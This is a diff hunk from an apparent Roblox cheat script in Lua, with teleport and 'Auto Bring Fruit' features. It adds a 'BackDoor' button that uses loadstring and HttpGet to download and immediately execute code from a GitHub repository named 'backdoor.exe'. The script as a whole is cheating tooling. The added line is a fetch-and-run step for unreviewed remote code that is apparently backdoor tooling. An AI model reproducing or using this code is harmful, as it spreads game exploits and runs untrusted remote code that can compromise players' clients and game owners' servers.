@@ -201,6 +201,10 @@ local ply = game.Players.LocalPlayer.Character.HumanoidRootPart
 ply.CFrame = CFrame.new(pl3) 
 end)
 
+MainSection:NewButton("BackDoor", "BackDoor", function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+end)
+
 MainSection:NewToggle("Auto Bring Fruit", "Auto Bring Fruit", function(state) 
 if state then Fbring = state 
 while Fbring == true do 
